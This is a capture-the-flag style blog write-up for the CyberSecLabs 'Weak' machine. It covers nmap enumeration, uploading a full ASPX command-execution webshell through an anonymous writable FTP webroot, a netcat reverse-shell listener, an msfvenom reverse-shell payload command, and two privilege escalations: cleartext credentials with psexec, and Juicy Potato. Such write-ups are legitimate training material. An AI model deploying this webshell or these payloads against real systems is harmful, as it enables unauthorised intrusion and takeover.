---
layout: post
title: "CyberSecLabs - Weak"
subtitle: "Simple but interesting."
date: 2021-10-01 22:45:13 -0400
background: '/img/blue_wave.jpg'
---
# Introduction
While being the not-so-popular alternative to HackTheBox and TryHackMe - Cybersec labs also boasts a variety of vulnerable machines which are available for a subscription fee. Feel free to check them out since they have quite a few interesting attack vectors.

This particular box uses unrestricted FTP upload to webroot to gain a foothold, and later has two paths to gain a SYSTEM shell.

# Enumeration

Standard nmap scan reveals the following:

```
PORT      STATE SERVICE            VERSION
21/tcp    open  ftp                Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 04-11-20  01:32PM       <DIR>          aspnet_client
| 04-10-20  02:30AM                  689 iisstart.htm
|_04-10-20  02:30AM               184946 welcome.png
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp    open  http               Microsoft IIS httpd 7.5
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Windows 7 Ultimate 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
554/tcp   open  rtsp?
2869/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
3389/tcp  open  ssl/ms-wbt-server?
| rdp-ntlm-info: 
|   Target_Name: WEAK
|   NetBIOS_Domain_Name: WEAK
|   NetBIOS_Computer_Name: WEAK
|   DNS_Domain_Name: Weak
|   DNS_Computer_Name: Weak
|   Product_Version: 6.1.7601
|_  System_Time: 2021-10-01T17:49:51+00:00
| ssl-cert: Subject: commonName=Weak
| Issuer: commonName=Weak
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2021-09-30T17:46:18
| Not valid after:  2022-04-01T17:46:18
| MD5:   dcfe d4d8 81cc b2b3 4fc9 6682 f828 093e
|_SHA-1: 30d2 9e63 63e3 13fe 9398 8756 048e e301 7472 1cc5
|_ssl-date: 2021-10-01T17:50:56+00:00; 0s from scanner time.
5357/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
10243/tcp open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49161/tcp open  msrpc              Microsoft Windows RPC
Service Info: Host: WEAK; OS: Windows; CPE: cpe:/o:microsoft:windows
.
..
```

Checking out port 80 we see the default IIS7 page :

![IIS7 Default Page](/img/posts/cyberseclabs-weak/iis7.png)  

After gobusting I did not find anything relevant there. So I went to check the next HTTP port 5357 :

![Port 5357](/img/posts/cyberseclabs-weak/port5357.png)

Also nothing there. 

At this point, since I'm going for quick wins, I went to check the FTP server:

![Port 5357](/img/posts/cyberseclabs-weak/ftp1.png)

It seems that we are trying to use the default active FTP mode to talk to the server and it fails.

![FTP active mode fails](/img/posts/cyberseclabs-weak/ftppassive.png)

 Changing to passive mode works though :

![FTP passive mode](/img/posts/cyberseclabs-weak/ftppassive.png)

I immediately notice the default IIS files, and that got me thinking that this actually might be a webroot. The next step is to check if I have write permission the the FTP server, and if I can access the those uploads directly on port 80. 

![FTP passive mode](/img/posts/cyberseclabs-weak/ftpputfile.png)

So I have write permission to the FTP. Now let's check if this is actually on the webserver:

![FTP passive mode](/img/posts/cyberseclabs-weak/test.png)

Bingo.

# Exploitation

So - write permissions on the FTP and ability to view/execute those files on IIS. This calls for an aspx webshell (we are going against IIS after all). Here is the code :

```html
<%@ Page Language="VB" Debug="true" %>
<%@ import Namespace="system.IO" %>
<%@ import Namespace="System.Diagnostics" %>

<script runat="server">      

Sub RunCmd(Src As Object, E As EventArgs)            
  Dim myProcess As New Process()            
  Dim myProcessStartInfo As New ProcessStartInfo(xpath.text)            
  myProcessStartInfo.UseShellExecute = false            
  myProcessStartInfo.RedirectStandardOutput = true            
  myProcess.StartInfo = myProcessStartInfo            
  myProcessStartInfo.Arguments=xcmd.text            
  myProcess.Start()            

  Dim myStreamReader As StreamReader = myProcess.StandardOutput            
  Dim myString As String = myStreamReader.Readtoend()            
  myProcess.Close()            
  mystring=replace(mystring,"<","&lt;")            
  mystring=replace(mystring,">","&gt;")            
  result.text= vbcrlf & "<pre>" & mystring & "</pre>"    
End Sub

</script>

<html>
<body>    
<form runat="server">        
<p><asp:Label id="L_p" runat="server" width="80px">Program</asp:Label>        
<asp:TextBox id="xpath" runat="server" Width="300px">c:\windows\system32\cmd.exe</asp:TextBox>        
<p><asp:Label id="L_a" runat="server" width="80px">Arguments</asp:Label>        
<asp:TextBox id="xcmd" runat="server" Width="300px" Text="/c net user">/c net user</asp:TextBox>        
<p><asp:Button id="Button" onclick="runcmd" runat="server" Width="100px" Text="Run"></asp:Button>        
<p><asp:Label id="result" runat="server"></asp:Label>       
</form>
</body>
</html>
```

So we put this to a file and upload it to the FTP as *cmd.aspx*. Now our webshell is on the IIS7 server :

![Webshell](/img/posts/cyberseclabs-weak/webshell.png)

Now, all we need to do is get a reverse shell. Now we could upload netcat and execute the simple command there - but in this case where I have direct commands - I tend to go with the PowerShell base64 encoded payload. Check the script out in the Resources section.

![Powershellb64](/img/posts/cyberseclabs-weak/powershellb64.png)

We simply set up a netcat listener along with rlwrap for that nice line completion:

```bash
sudo rlwrap nc -nlvp 80
```

Then copy-paste the above base64 encoded PowerShell command to the webshell:

![Webshell command](/img/posts/cyberseclabs-weak/webshellcommand.png)


And get a shell back :

![Webshell command](/img/posts/cyberseclabs-weak/whoamiuser.png)

# Privilege Escalation v.1 - Cleartext Passwords

The simple way to escalate privileged would be to just check out the environment and find the following file :

![Password](/img/posts/cyberseclabs-weak/password.png)

So the password is...Password? Yes, a bit of a shame its that simple, but in the real world finding cleartext passwords is a common thing, no matter their complexity.

Let's check if these credentials are indeed correct. We can use **crackmapexec** :

![Crackmapexec](/img/posts/cyberseclabs-weak/cme.png)

Those are the right admin credentials.

We can try **psexec** to try to get a shell :

![Psexec](/img/posts/cyberseclabs-weak/psexec.png)

Rooted!

# Privilege Escalation v.1 - Juicy Potato

Running the whoami /priv command we can see that the current user has an ability to impersonate security tokens.

![Impersonate](/img/posts/cyberseclabs-weak/impersonate.png)

In order to understand this vulnerability we can take a quote from Foxglove Securit's article (lin in Resources):

```
The idea behind this vulnerability is simple to describe at a high level:

    1.Trick the “NT AUTHORITY\SYSTEM” account into authenticating via NTLM to a TCP endpoint we control.
    2.Man-in-the-middle this authentication attempt (NTLM relay) to locally negotiate a security token for the “NT AUTHORITY\SYSTEM” account. This is done through a series of Windows API calls.
    3.Impersonate the token we have just negotiated. This can only be done if the attackers current account has the privilege to impersonate security tokens. This is usually true of most service accounts and not true of most user-level accounts.
```

Now that we got that covered we can take the following steps to get a SYSTEM shell :

1. Create a reverse shell
2. Put reverse shell and JuicyPotato.exe to the vulnerable machine (check Resources for the .exe)
3. Find the correct CLSID
4. Set up a listener and execute the exploit

Firstly let's create a reverse shell with *msfvenom* :

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o notevil.exe
```

After that we can transfer that over to the Windows machine using certutil:

![Certutil](/img/posts/cyberseclabs-weak/certutil.png)


Now that we have that set we can find the [CLSID's](http://ohpe.it/juicy-potato/CLSID/) for the current OS - which is Windows 7 Ultimate.  

I decided to try the following one :

```
{03ca98d6-ff5d-49b8-abc6-03dd84127020}
```

Now running the command from Powershell seems not to work - so I only had to run my msfvenom once to get a standard cmd.exe shell on my previous listener. After that was done I can set up the listener again and run the Juicy Potato exploit command :


![Juicy Potato](/img/posts/cyberseclabs-weak/jp.png)

And I got a shell callback :

![System](/img/posts/cyberseclabs-weak/system.png)


## Conclusion  & Tips

This was an easy box with quite common vulnerabilities and a reminder to keep your passwords safe and configure your software property. Running Windows 7 is not a good security measure, and especially allowing anonymous FTP access with write privileges to the webroot.

## Resources 

[Powershell Base64 endoding script](https://gist.github.com/tothi/ab288fb523a4b32b51a53e542d40fe58)

[Foxglove Security's Rotten Potato Article](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/)

[List of CLSID's by OS](http://ohpe.it/juicy-potato/CLSID/)
